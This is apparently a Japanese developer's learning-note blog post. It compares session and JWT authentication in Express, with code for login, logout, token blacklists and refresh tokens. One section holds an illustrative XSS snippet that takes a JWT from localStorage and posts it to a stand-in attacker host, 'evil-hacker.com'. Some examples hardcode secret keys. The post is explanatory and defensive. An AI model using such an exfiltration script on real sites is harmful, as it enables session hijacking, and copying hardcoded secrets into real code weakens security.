# JWT認証〜「ログイン状態を覚える」ための長い旅路〜

> **対象者**: 「なぜJWTなの？Cookieじゃダメなの？」と疑問に思っている方  
> **私の体験**: 認証方式の変遷を実際に経験して理解した、それぞれの長所と短所  
> **作成日**: 2025-09-20

## 📖 私の認証方式遍歴〜Session → JWT → の真実〜

### 第1章：最初のログイン機能（Session方式）

2019年、初めてログイン機能を実装した時のことです。

```javascript
// Express + Session の実装
const session = require('express-session');

app.use(session({
  secret: 'my-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 3600000 }  // 1時間
}));

// ログイン処理
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  
  if (user && bcrypt.compareSync(password, user.password)) {
    req.session.userId = user.id;  // セッションに保存
    res.json({ message: 'ログイン成功' });
  } else {
    res.status(401).json({ error: 'ログイン失敗' });
  }
});

// 認証が必要なAPI
app.get('/profile', (req, res) => {
  if (req.session.userId) {
    // セッションからユーザーIDを取得
    const user = await User.findById(req.session.userId);
    res.json(user);
  } else {
    res.status(401).json({ error: '未ログイン' });
  }
});
```

先輩：「いいね！基本的な実装はできてる」
私：「簡単でした！」

**でも、1週間後に問題が発生しました...**

---

### Session方式で出会った現実の壁

#### 問題1：「サーバーを再起動したらみんなログアウトした！」

```javascript
// 開発中の私
// サーバーを再起動
$ npm run dev

// ユーザーから苦情
「さっきまでログインしてたのに、急にログアウトされました！」

// 原因：セッションがメモリに保存されている
// サーバー再起動 = メモリクリア = セッション消失
```

**解決策を調べる→「Redisに保存しろ」**

```javascript
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: 'my-secret-key',
  // ...
}));
```

私：「Redisって何？また覚えることが増えた...😵」

#### 問題2：「モバイルアプリから使えない！」

2020年、ReactNativeでモバイルアプリを作ることになりました。

```javascript
// React Nativeから
fetch('http://localhost:3000/api/profile')
  .then(res => res.json())
  .then(data => console.log(data));

// 結果：401 Unauthorized

// 原因：モバイルアプリはブラウザじゃない
// → Cookieが自動で送られない
// → セッション認証が機能しない
```

私：「えっ、別の認証方式を作らないといけないの？」

#### 問題3：「本番環境でスケールしない！」

```javascript
// サーバー1台のとき
ユーザー → サーバーA（セッション保存）
         「ログイン中です」

// サーバー2台に増やしたとき  
ユーザー → ロードバランサー → サーバーA（セッションあり）
                          → サーバーB（セッションなし）

// 結果：どのサーバーに振り分けられるかで、
//      ログイン状態が変わってしまう！
```

解決策：「スティッキーセッション」や「共有セッション」

私：「なんでこんなに複雑なの...😭」

---

### 第2章：JWT方式との出会い

ある日、先輩が言いました。

先輩：「JWTって知ってる？」
私：「ジョット？」
先輩：「ジェイダブリューティー。トークンベースの認証方式だよ」

```javascript
// JWT認証の仕組み
// 1. ログイン時：サーバーがトークンを発行
// 2. API呼び出し時：クライアントがトークンを送信
// 3. サーバー：トークンを検証（データベース不要！）

// ログイン処理（JWT版）
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  
  if (user && bcrypt.compareSync(password, user.password)) {
    // JWTトークンを生成
    const token = jwt.sign(
      { userId: user.id, email: user.email },
      'secret-key',
      { expiresIn: '1h' }
    );
    
    res.json({ token });  // トークンをクライアントに返す
  }
});

// 認証チェック（JWT版）
app.get('/profile', authenticateToken, (req, res) => {
  // req.user に復号化されたユーザー情報が入ってる
  res.json(req.user);
});

function authenticateToken(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'トークンがありません' });
  }
  
  jwt.verify(token, 'secret-key', (err, user) => {
    if (err) {
      return res.status(403).json({ error: '無効なトークン' });
    }
    req.user = user;
    next();
  });
}
```

私：「お？これならサーバーが状態を持たない！」

---

### JWTがもたらした「魔法」

#### 魔法1：サーバーレス（ステートレス）

```javascript
// Session方式
クライアント → サーバー：「私のセッションIDは ABC123 です」
サーバー → Redis：「ABC123のユーザー情報ください」
Redis → サーバー：「ユーザーID: 456です」
サーバー → クライアント：「OK、データを返します」

// JWT方式  
クライアント → サーバー：「私のトークンは eyJ... です」
サーバー：「トークンを確認...OK、ユーザーID: 456ですね」
サーバー → クライアント：「データを返します」

// Redisも、セッション保存も不要！
```

#### 魔法2：マルチプラットフォーム対応

```javascript
// Webアプリ（React）
localStorage.setItem('token', response.token);
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});

// モバイルアプリ（React Native）  
AsyncStorage.setItem('token', response.token);
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${await AsyncStorage.getItem('token')}`
  }
});

// 同じAPIが使える！
```

#### 魔法3：スケーラビリティ

```javascript
// どのサーバーに振り分けられても動く
ユーザー → ロードバランサー → サーバーA（トークンを検証）✅
                          → サーバーB（トークンを検証）✅
                          → サーバーC（トークンを検証）✅

// すべてのサーバーが同じ秘密鍵を持っていれば、
// どこでも認証できる！
```

---

### 第3章：JWTの落とし穴に落ちた日

私：「JWT最高！もうSessionには戻れない！」

**でも、現実はそう甘くなかった...**

#### 落とし穴1：「ログアウトできない！？」

```javascript
// Session方式のログアウト
app.post('/logout', (req, res) => {
  req.session.destroy();  // セッション削除
  res.json({ message: 'ログアウト成功' });
});

// JWT方式のログアウト
app.post('/logout', (req, res) => {
  // ...どうする？
  // トークンはクライアント側にある
  // サーバーは「このトークンは無効」と記録できない
  res.json({ message: 'ログアウト成功（？）' });
});

// 問題：古いトークンがまだ有効
// ユーザーA：「ログアウトしたのに、なぜかまだアクセスできる...」
```

**解決策：ブラックリスト**

```javascript
const blacklistedTokens = new Set();

app.post('/logout', authenticateToken, (req, res) => {
  const token = req.headers['authorization'].split(' ')[1];
  blacklistedTokens.add(token);  // ブラックリストに追加
  res.json({ message: 'ログアウト成功' });
});

function authenticateToken(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (blacklistedTokens.has(token)) {
    return res.status(401).json({ error: 'ログアウト済み' });
  }
  
  // JWT検証...
}
```

私：「あれ？結局サーバーが状態を持ってる...😅」

#### 落とし穴2：「トークンが盗まれたら終わり」

```javascript
// XSS攻撃でJWTが盗まれる例
// 悪意のあるスクリプトが埋め込まれた場合

<script>
  // localStorageからトークンを盗む
  const stolenToken = localStorage.getItem('token');
  
  // 攻撃者のサーバーに送信
  fetch('https://evil-hacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: stolenToken })
  });
</script>

// 盗まれたトークンで攻撃者がAPIにアクセス
fetch('https://your-api.com/api/transfer', {
  headers: {
    'Authorization': `Bearer ${stolenToken}`
  },
  // ...
});
```

**解決策：セキュリティ対策の多重化**

```javascript
// 1. アクセストークン（短期間）+ リフレッシュトークン（長期間）
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

// 2. HttpOnly Cookieでリフレッシュトークン保存
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,      // JavaScriptからアクセス不可
  secure: true,        // HTTPS必須
  sameSite: 'strict'   // CSRF攻撃対策
});

// 3. CSRFトークン
// 4. レート制限
// ...
```

私：「セキュリティ、奥が深すぎる...😵‍💫」

---

### 第4章：現実的なJWT実装〜meal-voteから学んだこと〜

meal-voteプロジェクトでは、実際に以下のような実装になっていました：

```typescript
// 1. トークンペア方式
export interface TokenPair {
  accessToken: string;   // 15分
  refreshToken: string;  // 7日
}

// 2. 環境変数での秘密鍵管理
const config = {
  jwtSecret: process.env.JWT_SECRET,
  jwtRefreshSecret: process.env.JWT_REFRESH_SECRET,
  jwtExpire: '15m',
  jwtRefreshExpire: '7d'
};

// 3. 役割ベースアクセス制御
const payload: JWTPayload = {
  userId: user._id.toString(),
  email: user.email,
  role: user.role,        // admin or member
  familyId: user.familyId.toString()
};

// 4. ミドルウェアでの認証
export const authenticate = async (req, res, next) => {
  try {
    const token = extractTokenFromHeader(req.headers.authorization);
    const decoded = verifyAccessToken(token);
    
    // データベースでユーザー存在確認（重要！）
    const user = await User.findById(decoded.userId);
    if (!user) {
      return res.status(401).json({ error: 'ユーザーが見つかりません' });
    }
    
    req.user = user;
    next();
  } catch (error) {
    res.status(401).json({ error: '認証失敗' });
  }
};
```

---

### 私が学んだ教訓

#### 1. 「完璧な認証方式」は存在しない

- **Session**: サーバー負荷、スケーラビリティの問題
- **JWT**: セキュリティリスク、ログアウト問題
- **どちらも**: 正しく実装すれば安全

#### 2. 要件に応じて選択する

```javascript
// Session方式が向いている場合
- 主にWebアプリケーション
- サーバー台数が少ない
- セキュリティを最重視
- 即座にセッション無効化が必要

// JWT方式が向いている場合  
- マルチプラットフォーム（Web + Mobile）
- マイクロサービス
- CDN・分散キャッシュ活用
- スケーラビリティ重視
```

#### 3. セキュリティは多層防御

```javascript
// JWT使うなら必須
- 短期間のアクセストークン
- リフレッシュトークンローテーション
- HTTPS必須
- XSS対策（CSP, サニタイズ）
- CSRF対策
- レート制限
```

#### 4. 実装は段階的に

```javascript
// Phase 1: 基本実装
- JWTの生成と検証
- ログイン・ログアウト

// Phase 2: セキュリティ強化
- リフレッシュトークン
- ブラックリスト

// Phase 3: 運用改善
- ログとモニタリング
- パフォーマンス最適化
```

---

## まとめ：認証は「体験」から理解する

教科書やドキュメントで理論を学ぶことも大切ですが、
認証方式の本当の違いは、実際に実装して運用してみないと分かりません。

私も最初は「なんでJWTなの？」と思いましたが、
Sessionの限界を体験して、JWTの必要性を理解しました。

そしてJWTの落とし穴にも落ちて、「完璧な解決策はない」ことも学びました。

**大切なのは**：
- なぜその技術が生まれたのかを理解する
- 実際に手を動かして体験する
- トレードオフを受け入れる
- セキュリティを意識し続ける

次にJWTを実装するときは、私のような回り道をしなくて済むように、
この経験が役に立てば嬉しいです。

---

> **Tags**: #JWT #認証 #Session #セキュリティ #実装体験 #学習ノート #バックエンド #失敗談

> **関連ページ**: [[REST_API設計_基礎と実践]] | [[CORS_なぜブラウザは他のサイトへのアクセスを嫌がるのか]]